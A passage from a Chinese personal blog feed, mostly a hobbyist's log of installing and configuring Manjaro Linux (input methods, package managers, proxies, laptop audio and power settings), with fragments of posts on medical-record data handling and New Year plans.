punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO `medical_EHR` (`HIS`,`Chief_complaint`) VALUES (%s, %s)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其他">其他</h2><p>一些大段的文本，比如主诉、病史之类的后期结构化用LSTM或者Bert跑一下，这个以后再讲。</p><p>现在这个电子病历吧，感觉跟纸币支付宝化一样，疯狂泄露隐私等问题根本没人管，指不定哪天你个人信息全给你卖了。 以后你们到医院还是能要纸质凭据就要纸质的，回头出了什么事找医院撕逼比较好办。另，现在医保吃紧，交了很多年医保到了用的时候大概率被赖账，别被坑了找医院讨说法还被打成医闹反动分子；什么？医生不都是弱势群体白衣天使咩？啊这，你说是那就是。</p><blockquote><p>三个劫道的不如一个卖药的,三个卖药的不如一个开学校的</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;有两种鬼画符，一种是医生的字，一种是正则表达式</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="xml" scheme="https://zhangjk98.xyz/tags/xml/"/>
    
    <category term="电子病历" scheme="https://zhangjk98.xyz/tags/%E7%94%B5%E5%AD%90%E7%97%85%E5%8E%86/"/>
    
  </entry>
  
  <entry>
    <title>你好，Manjaro。再见，Manjaro。</title>
    <link href="https://zhangjk98.xyz/ff0e/"/>
    <id>https://zhangjk98.xyz/ff0e/</id>
    <published>2020-01-17T02:41:09.000Z</published>
    <updated>2020-01-17T02:41:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>本来我是想装个双系统的，但是想起教研室还有两个老主机，那就..... <a id="more"></a></p><p><del>装Arch是不可能装Arch的</del></p><h2 id="更新再见manjaro">更新———再见Manjaro</h2><p>前一阵Manjaro社区出的争吵让我跑路了，Manjaro之前用的还比较舒服（当然直到现在都比较舒服），以后就不知道怎么样了。外面Arch社区骂声一片，里面还总在内斗，不断有人出走，前几周连jonathon都气走了（跑去隔壁endeavour os了）</p><p>jonathon的声明在<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5tYW5qYXJvLm9yZy90L2NoYW5nZS1vZi10cmVhc3VyZXItZm9yLW1hbmphcm8tY29tbXVuaXR5LWZ1bmRzLzE1NDg4OA==">这篇帖子<i class="fa fa-external-link-alt"></i></span></p><p>过程大概是这样的，philm（Manjaro的CEO，反正Manjaro社区的不少人都觉得此人非常讨厌）挪用社区赞助捐款2000欧元，用于给自己买的电脑。这次购买并没有跟掌钱管家jonathon商量，也没有在社区内征得同意。jonathon觉得按照规定这钱只能用于Manjaro项目的网站建设、项目推广之类的，不是给你们恰烂钱的，然后在论坛发帖子怼philm，然后帖子被删了一次，jonathon的管理员也被撤了。帖子下面众人纷纷表示philm不回应道歉以后再也不捐助Manjaro了，不少人表示以后再也不用Manjaro了，并考虑跑路到KDE Neon、Kubuntu、Arch、Endeavour OS。</p><p>philm的回应闪烁其辞，一直说事情不是大家想的那个样子的，但是大家怼他让他公布他和jonathon的完整聊天记录他又不肯。最后philm屁事没有，jonathon跑路去了Endeavour OS。</p><p>我之前从Ubuntu换到Manjaro，现在跟着jonathon跑到endeavour os（Antergos 的后继项目），因为懒得搞网卡驱动和g双显卡驱动了（这个Arch系的发行版显卡驱动、TLP和s-tui之类的也会附带装上，默认xfce桌面有很多系统自带的定制，我装的KDE，基本上相对于Arch没怎么魔改，附带了驱动个和很多常用的包）目前用着感觉还好，观察一下再评价。</p><h2 id="安装">安装</h2><p>选Manjaro是因为对华硕老主板的硬件和驱动支持比较好，安装也比较方便（我可不想自己折腾Nvida驱动）。</p><p>（喜欢KDE桌面，又不想用openSUSE，Kubuntu之前试过体验不是特别好，转了一圈就Manjaro了）</p><p>去官网下了最新版的 Manjaro18.1.5 KDE桌面版本，还是拿Rufus做好启动盘用UEFI装，这里把空闲的老机子直接擦除原来已毕业师兄的win10（erase disk），选 no Hibernate（我不太喜欢systemd，就没设休眠）</p><p>看到选项里有个选择LibreOffice还是Free Office的选项，这里我选了FreeOffice试用，体验过两个月再回来填坑写体会。 （更新，还是WPS吧。。。）</p><p>可以断网安装。没有遇到问题，直接装好了，超乎想象的顺利。唯一的小插曲是装完系统后U盘只剩4M空间，用win10默认的格式化找不回来了，看了<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzc3MjgyNQ==">这里<i class="fa fa-external-link-alt"></i></span> 网上教程已经很多了，我也不打算再写一篇了，下面仅作个人记录(其实并不怎么需要教程，过时得太快，还不如直接看官方wiki或者iso里打包的安装手册，不想看直接照着提示直接装都没问题，比Ubuntu好装太多了) <img src="/ff0e/neofetch-manjaro.webp" alt="manjaro-neofetch" /> 内置python是3.8.1，我一时竟有些不习惯😂</p><h2 id="配置">配置</h2><h3 id="换镜像源">换镜像源</h3><p>当然还是换成你电的，在<code>/​etc/​pacman.d/​mirrorlist</code>加上你电</p><h3 id="输入法">输入法</h3><p>更新，现在有一个官方打包的AUR： manjaro-asian-input-support，在community里面，有manjaro-asian-input-support-fcitx、manjaro-asian-input-support-ibus、manjaro-asian-input-support-ibus、manjaro-asian-input-support-fcitx5</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S manjaro-asian-input-support-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后重启直接就能用了</p><p>KDE推荐fcitx，Gnome下大概ibus体验会好一点？（好吧其实我之前在Ubuntu Gnome上用的也是fcitx）</p><p><strong>下面这些都不用看了</strong></p><p>我用的<del>sunpinyin</del>libpinyin（一个比sunpinyin更新的输入法），googlepinyin也可以，sougoupinyin不推荐，对于它的流氓行为我实在无法放心（如果非要装，记得装fcitx qt4 或 qt5）</p><p>如果想要联网提示的功能可以装个cloudpinyin(要用archlinuxcn的源)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S fcitx-im fcitx-googlepinyin fcitx-libpinyin fcitx-cloudpinyin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有个小问题，那个很多教程都写的/.xproflie, 官方wiki里新版是 ~/.pam_environment里面加上那三行, fcitx官网上说是那个~./xprofile, 这里我放到.pam_enviroment里面了。</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">GTK_IM_MODULE&#x3D;fcitxQT_IM_MODULE&#x3D;fcitxXMODIFIERS&#x3D;@im&#x3D;fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后点开右下角键盘的configure（配置）看不到输入法了，界面是空的，以为是系统语言非中文的问题，但是换了系统语言重启了以后还是不行。 运行了一下fcitx-diagnose, 报这个错误</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">fcitx: BadWindow (invalid Window parameter)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>感觉是看不知道哪个教程的时候在~/.xinitrc里面乱配置的时候出问题了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span>zh_CN.UTF-8<span class="token builtin class-name">export</span> <span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span>fcitx<span class="token builtin class-name">export</span> <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span>fcitx<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span><span class="token string">"@im=fcitx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>搜了一下是我弱智了，看<span class="exturl" data-url="aHR0cHM6Ly9iYnMuYXJjaGxpbnV4Y24ub3JnL3ZpZXd0b3BpYy5waHA/aWQ9MTg2Mg==">这里<i class="fa fa-external-link-alt"></i></span>，照着教程乱搞的时候都没注意到。 这里把exec放到后面就行了，或者放到.xprofile里面</p><p>配置看这里 https://fcitx-im.org/wiki/Configure_(Other)/zh-hans</p><p>我看很多教程都是用的fcitx-configtool，这里推荐KDE桌面用kcm-fcitx进行设置，也可以直接编辑config文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S kcm-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="软件包管理">软件包管理</h3><h4 id="pacman">pacman</h4><p>装包首选pacman，然后是AUR，然后是其他pip、npm、deb之类的包（貌似Manjaro发布的20版pamac软件商店还支持了snap和flatpac......），然后是自己编译（对自己打包技术自信的编译狂魔请无视), 这样可以避免不少包冲突。 yaourt已经停止维护了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>，2020年了很多教程都还是这个，请自行换成yay<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>等</p><p>另外多说一句，Manjaro很多地方和Arch还是不一样的，随便添加arch源或者archlinuxcn源是要出问题的</p><p>要加包优先从AUR里面加，尽量不要用archlinuxcn里的东西，Manjaro很多魔改和更新依赖版本速度和Arch不一样，非要使用archlinuxcn灵车漂移就把Manjaro设成unstable（并且出了事不要去archlinuxcn那里问，切记）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman-mirrors --api --set-branch unstable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>虽然名字叫unstable，但是它和Arch的stable基本上是类似的（它还要比Arch的stable慢三天），这意味着换成unstable再上archlinuxcn源灵车漂移翻车的几率会小一点。</p><p>Manjaro的包会比Arch的更新频率慢一点，Manjaro有三种选项，stable，testing和unstable，unstable比Arch的stable慢三天左右，testing比unstable慢，stable比testing慢。一般只是延后了几周而已，可以放心上unstable</p><h4 id="yay安装aur软件">yay安装AUR软件</h4><p>这里用vscode举个栗子</p><p>不像apt有官方包，VSCode在文档上说可以用这个<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9zZXR1cC9saW51eCNfYXVyLXBhY2thZ2UtZm9yLWFyY2gtbGludXg=">非官方包<i class="fa fa-external-link-alt"></i></span></p><p>按照正常的AUR安装方式是这样的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S <span class="token function">git</span><span class="token builtin class-name">cd</span> /Downloads<span class="token function">git</span> clone https://AUR.archlinux.org/visual-studio-code-bin.git<span class="token builtin class-name">cd</span> visual-studio-code-bin/<span class="token function">sudo</span> pacman -U visual-studio-code-bin-*.pkg.tar.xz<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/ <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">rm</span> -rfv visual-studio-code-bin/code <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们有<code>yay -S visual-studio-code-bin</code>可以代替上面那一串命令 （pacman现在也有了包，直接pacman就好了<code>pacman -S code</code>）</p><h4 id="pamac">pamac</h4><p>另一种方法是直接从软件商店里点击安装，pamac或者octopi，其实也不算win10 巨硬store或者snap那种软件商店，大概就是一个pacman的GUI客户端吧（很多时候报错和提示并不好用，建议下载和更新还是用命令）</p><p>尤其不要同时开着pamac图形界面并打开pacman，pacman进程加锁出错系统容易崩了</p><h3 id="网上冲浪">网上冲浪</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把config.json放到/etc/v2ray下面 然后配置开机自启和启动（这里用systemd）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> v2ray  <span class="token comment">#开机启动</span>systemctl start v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后配合switchyomega或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span>或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvZmwwci9wcm94eWNoYWlucy1uZw==">proxychains-ng<i class="fa fa-external-link-alt"></i></span></p><p>如果还是习惯客户端可以试试v2rayA<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p><h3 id="其他">其他</h3><p>暂时没什么要说了，过一个月再来说体验吧，美化什么的也不想搞了，老主机带不动，我也老了，哎呀，对花里胡哨的欣赏不来了，一律默认配置</p><p>想起什么再说吧，ArchWiki真棒，看Wiki吧</p><h4 id="一些设置的小问题">一些设置的小问题</h4><p>装完输入法之后输入法调不出来了，发现Yakuake也调不出来了，感觉快捷键设置冲突，改快捷键设置就好了。</p><h2 id="后记">后记</h2><p>总能看到一大批Arch玩家在Linux群里发洗手图疯狂劝退Manjaro用户 但是看到下面这篇，我决定还是用Manjaro吧。各种洗手劝退根本没给出让我换系统的强力理由 <span class="exturl" data-url="aHR0cHM6Ly9yZW50cnkuY28vbWFuamFyby1jb250cm92ZXJzaWVz">Manjaro Controversies<i class="fa fa-external-link-alt"></i></span> 中文版<span class="exturl" data-url="aHR0cHM6Ly9zemNsc3lhLm1lL3poLWNuL3Bvc3RzL2xpbnV4L21hbmphcm9fY29udHJvdmVyc2llcy8=">[译] Manjaro 悖论<i class="fa fa-external-link-alt"></i></span> 我还用windows呢，我还用Ubuntu呢，本弱智儿童欢乐多，你们随便怎么鄙视。自从当了硬件逃兵不折腾板子不玩单片机树莓派我连C都不怎么用，欢乐的拿python乱写脚本呢，节省心智的东西有时候真是好东西</p><p>人生苦短， In the long run, we are all dead（虽然我并不喜欢凯恩斯主义）</p><p>我一直觉得商业化是个好事，尤其是操作系统这种东西。私以为大多数情况下知识产权是个好东西，收费也是个好东西，垄断是个坏东西。开源的一个重要贡献就是打破垄断。（虽然现在很多专利什么的都被玩坏了，特别是国内） 操作系统这种工业级的东西，商业化是正道，<strong>微软的问题在于它的垄断，而不是商业化</strong></p><p>（这Manjaro一股 Windows Vista 味，好看好用，bug多也能接受</p><h2 id="时隔5个月的更新">时隔5个月的更新</h2><p>终于返校了，这疫情闹得，哎呀</p><p>据说长时间不追滚动更新可能滚炸，不管了，硬着头皮试一下</p><p>直接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> pacman -Syyu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新后重启显示密码不对，不知道是什么问题，试着重置了一下密码</p><p>（并不是我忘记密码了，这里据说前一阵不少人的KDE桌面密码出问题登录认证失败了）</p><p>重启按esc进grub</p><p>按e，在有<code>linux /boot /vmlinuz-linux</code>的那一行添加<code>init=/bin/bash</code></p><p>ctrl+x出去输入<code>mount -n -o remount,rw /</code>给根目录读写权限，然后输<code>passwd</code>改密码，然后<code>reboot</code>重启</p><p>看起来没什么问题了，隔了几个月也没滚炸（至少看起来没有）</p><h2 id="笔记本也换成manjaro了">笔记本也换成Manjaro了</h2><h3 id="安装-1">安装</h3><p>小破本是灵越7591，不太想用win10了，Dell家的大部分系列都完美兼容Ubuntu（国外出售的7590的还有个developer版的装的就是Ubuntu，比预装win10少了一点微软授权费，可惜国内没有）</p><p>看到他们好多用黑苹果，我的本子不是4k，就没上黑果。（黑果Nvida独显也用不了）</p><p>Manjaro看到别人装上去还不错，索性就装Manjaro了（除了麦克风和显卡的驱动有点小麻烦，其他的蓝牙wifi触控板键盘休眠一切正常）Archwiki上也有同系列7590的参考<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p><p>BIOS里关secureboot，改raid on为AHIC（不装双系统可以忽略，双系统记得改AHIC不然win10会蓝屏卡在启动界面）</p><p>装完发现Manjaro 20居然添加了snap商店，这是要跟Canonical同流合污？（逐渐Ubuntu化</p><p>KDE桌面内存占用在700M左右，还行</p><p>Ubuntu的显卡和外接显示器对Dell的本子都配适的极好，有Dell官方担保，不想折腾可以直接上Ubuntu（这款海外版有的就是预装Ubuntu，双显卡解决方案应该是Prime）</p><h3 id="显卡驱动问题">显卡驱动问题</h3><p>不需要Nvida的卡就直接选free，装intel的核显就好了</p><p>想用Nvida的卡（好歹是一块1650ti不用太浪费了），装的时候Manjaro驱动选项可以直接选nofree，会自带</p><p>切换双显卡的配置可能导致看视频时卡成PPT，禁用硬件加速就好了，7591的丐版CPU硬解码也是带的动视频的（1080p没有任何问题）</p><h3 id="麦克风声卡配置">麦克风声卡配置</h3><p>之前7591的部分高通声卡驱动不行，麦克风用不了，后来有了一个开源的驱动<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXNvZnByb2plY3Qvc29m">Sound open firmware<i class="fa fa-external-link-alt"></i></span>，总归是能用了。</p><p>在linux kernel在5.6或以上，安装麦克风声卡驱动用的sof-firmware，可以解决声音和麦克风问题</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S sof-firmware<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后重启，我第二次重启后失效，喇叭和耳机都没有声音。按照wiki里面修改<code>/etc/modprobe.d/audio-fix.conf</code>(新建一个)，然后写一行</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">options snd-intel-dspcfg dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就行了。</p><p>或者在Grub的配置文件<code>/etc/default/grub</code>里设置</p><pre class="line-numbers language-config" data-language="config"><code class="language-config">snd-intel-dspcfg.dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实在不行再试试内核参数(Kernel parameters)加上<code>snd_hda_intel.dmic_detect=0</code></p><p>当然，仅仅是能用。声音效果不是太好，虽然灵越inspiron 7591/7590/7501 系列的扬声器声音本来就不太好，但是放点陶笛和埙的曲子还是有种凄婉呜咽感的，linux下用了sof之后感觉像是喇叭声。以后就只适合拿这个听刀郎了。</p><p>还有一个问题就是有的时候休眠挂起后再打开就没声音了，需要重启才行。暂时没找到什么好的办法，这个毛病之前win10就有</p><h3 id="mm耳机没声音">3.5mm耳机没声音</h3><p>耳机孔没声音，wiki上的解决方案是</p><blockquote><p>In <code>pavucontrol</code>, try changing the Pulseaudio output profile from "Analog Stereo Output" to "Analog Stereo Duplex".</p></blockquote><p>系统语言调成中文的用户点开系统设置-》音频音量设置=》音频=》高级=》内置音频，选模拟立体双工。</p><p>是的，这样就能用了（请忽略这个全损音质，耳机传来声音的时候我甚至觉得我的索尼耳机是拼多多10块钱买的）</p><h3 id="耗电问题">耗电问题</h3><p>这个目前我倒是没什么感觉，我的7591是97w的大电池版本，最好的省电办法是不用GNOME，KDE的掉电速度比GNOME大概能慢一半，轻度使用六七个小时没有太大问题。（跟win10上10个小时比还是有差距）。</p><p>极致省电可以上i3wm和禁用独显，不过7591电池够大，不像游戏本一样分分钟没电，倒是没有必要。</p><p>还有就是降压，给CPU降个50-75mV，效果感人。（对性能影响也很小）</p><p>然后安装thermald和tlp并设置开机自启动（tlp有个图形界面可惜是gtk的并且还在beta版，不太KDE用户建议用）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S thermald tlpsystemctl <span class="token builtin class-name">enable</span> thermald tlp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后自行设置电池模式。</p><h3 id="散热">散热</h3><p>当然7591/7590更要命的显然是捉急的散热，重度使用建议降压、换散热贴硅脂散热条、垫橡皮垫都安排上。有个s-tui可以查看CPU温度。</p><h2 id="其他个人设置">其他个人设置</h2><h3 id="常用软件">常用软件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker</span><span class="token function">sudo</span> pacman -S docker docker-compose<span class="token comment"># 设置开机自启</span><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中英词典翻译和医学词典">中英词典翻译和医学词典</h4><p>这里我用的开源的GoldenDict配合离线和在线词典</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S goldendict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载医学词典和英文词典，体验还是不错的，想要翻译功能可以添加有道和谷歌翻译</p><h3 id="博客搬迁">博客搬迁</h3><p>先装node.js（这里我装的12的lts版）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy nodejs-lts-erbium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后从github拉取自己的博客备份repo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/archaeoraptor/blog.git blog<span class="token builtin class-name">cd</span> blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外我用的hexo-renderer-pandoc插件，这个插件要先装pandoc（不然会报错）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S pandoc<span class="token function">npm</span> <span class="token function">install</span><span class="token function">git</span> clone https://github.com/next-theme/hexo-theme-next.git themes/nexthexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windows软件解决方案">windows软件解决方案</h3><p>装wine体验还是不太好，虚拟机装个win7上跑qq和word，反正7591能加内存，加到32G就完事了，还不够就加64G（是的，这个系列支持64G内存，虽然说明书上写的只支持到32G）</p><h3 id="网上冲浪-1">网上冲浪</h3><p>qv2ray还不错，electron-ssr装上v2ray插件也不错，但是electron内存占用太高了。喜欢web版的还有一个v2raya可以用。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S qv2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>装wireguard</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S wireguard-tools wireguard-dkms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果用机场的话，可以装个clash，然后配置开机自启和规则（那个win版clash的图形界面真的反直觉反人类，相当难受，clashy也没好到哪去），貌似也支持套个tun/tap用来全局代理(似乎并不怎么好用)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S clash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以配置systemd让clash开机自启，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RyZWFtYWNyby9jbGFzaC93aWtpL2NsYXNoLWFzLWEtZGFlbW9u">wiki<i class="fa fa-external-link-alt"></i></span>上还提供了docker-compose和pm2的方法。(貌似pm2方便一点？尤其是装了nodejs的话，不过clash是go开发的官方推荐docker，不过docker和pm2要开机自启还是得用systemd)</p><p>上个月发布的clash1.0版本是和老版本不兼容的<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>，AUR里打包的clash是不兼容的，所以要手动修改yml文件或者自己编译老版本的clash</p><blockquote><p><code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> is no longer used. They are now respectively <code>proxies</code>, <code>proxy-groups</code> and `rules</p></blockquote><p>(修改的话一般只要修改<code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> 这三个参数为<code>proxies</code>, <code>proxy-groups</code> and `rules就行了)</p><p>设置完成后重启网络服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart systemd-networkd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="中英文和字体设置">中英文和字体设置</h3><h4 id="把桌面文件夹改回英文">把桌面文件夹改回英文</h4><p>这里我用的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dOT01FL3hkZy11c2VyLWRpcnMtZ3Rr">xdg-user-dirs-gtk<i class="fa fa-external-link-alt"></i></span>，GNOME出品，KDE上也能用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy xdg-user-dirs-gtk<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_USxdg-user-dirs-gtk-update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后想把LANG变量调回中文的可以再调回来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你用Dolphin文件夹管理器，你要把那几个桌面、文档、下载的路径在编辑里面手动改成英文</p><h4 id="tty中文不显示">tty中文不显示</h4><p>装点字体就好了，或者直接把全局的LANG=en.US</p><h4 id="复门等字体显示日文">复门等字体显示日文</h4><p>最简单的做法是把系统装的语言包卸载了，只装中文字体包,见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xvY2FsaXphdGlvbl8oJUU3JUFFJTgwJUU0JUJEJTkzJUU0JUI4JUFEJUU2JTk2JTg3KS9TaW1wbGlmaWVkX0NoaW5lc2VfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Localization<i class="fa fa-external-link-alt"></i></span>。</p><p>或者在<code>\etc\locale.conf</code>加上<code>LANG=zh_CN.UTF-8</code></p><p>然后刷新字体缓存。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fc-cache -fv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="注">注</h2><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/AUR_helpers<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2" role="doc-endnote"><p>https://github.com/Jguer/yay<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3" role="doc-endnote"><p>https://aur.archlinux.org/packages/v2raya<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn4" role="doc-endnote"><p>https://wiki.archlinux.org/index.php/Dell_Inspiron_15_(7590)<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn5" role="doc-endnote"><p>https://github.com/Dreamacro/clash/wiki/Breaking-Changes-in-1.0.0<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来我是想装个双系统的，但是想起教研室还有两个老主机，那就.....</summary>
    
    
    
    <category term="不务正业系列" scheme="https://zhangjk98.xyz/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="manjaro" scheme="https://zhangjk98.xyz/tags/manjaro/"/>
    
  </entry>
  
  <entry>
    <title>写在被消灭的路上</title>
    <link href="https://zhangjk98.xyz/aa1c/"/>
    <id>https://zhangjk98.xyz/aa1c/</id>
    <published>2019-12-26T11:40:05.000Z</published>
    <updated>2019-12-26T11:40:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>庚子年，格外的长 <a id="more"></a></p><p>谶言里庚子年破事可不少，现在全世界都看起来不太平，暗流涌动。就不睁眼说瞎话搞些新年大吉之类的玩意了。</p><h2 id="庚子鼠年计划">庚子鼠年计划</h2><p>还记得当年的梦想吗，不仅天涯变了，新浪搜狐变了，谷歌也免不了（也许没变，当年才是装的）。看了一圈，真诚可爱的反而就是花姐王垠之流。</p><figure><img src="/aa1c/google.jpg" alt="当年" /><figcaption aria-hidden="true">当年</figcaption></figure><p>唯见日寒月暖，来煎人寿</p><blockquote><p>十年的经历教会了我很多，但不免也有许多被浪费的时间和精力，值得我反思和总结。总的看来，我并没有比其他人做得更差。很多 IT 人终其一生也没有学会什么新东西，很多人为了保住自己的饭碗，写出面条一样扭曲，别人不敢碰的代码。转岗做管理也是各种瞎指挥，看其他人眼色行事，一切为了“站对了队”，为了混到更高的位置。</p></blockquote><p>我现在在勃八本的劝退专业搬着没什么用的砖，搞着骗钱的垃圾项目划水摸鱼制造垃圾写bug，惭愧</p><p>本来我还是想做一点事情的，现在发现不如划水去搞点有意思的</p><div class="note success"><h3 id="看看范畴论矩阵代数">看看范畴论、矩阵代数</h3><p>大一大二那会不听课，埋头啃高代数分数理方程看朗道，试图啃过近世代数，没啃动 现在一年没怎么推公式，发现已经不如之前了，我怕不是要老了。 有些东西，三四十岁再学就学不动了</p></div><div class="note success"><h3 id="看看csapp等书">看看CSAPP等书</h3><p>补一补你电只讲名词概念浪费生命的微嵌课欠下的债</p></div><div class="note success"><h3 id="学一点数据库和javascript">学一点数据库和javascript</h3><p>之前打算</p></div><div class="note success"><h3 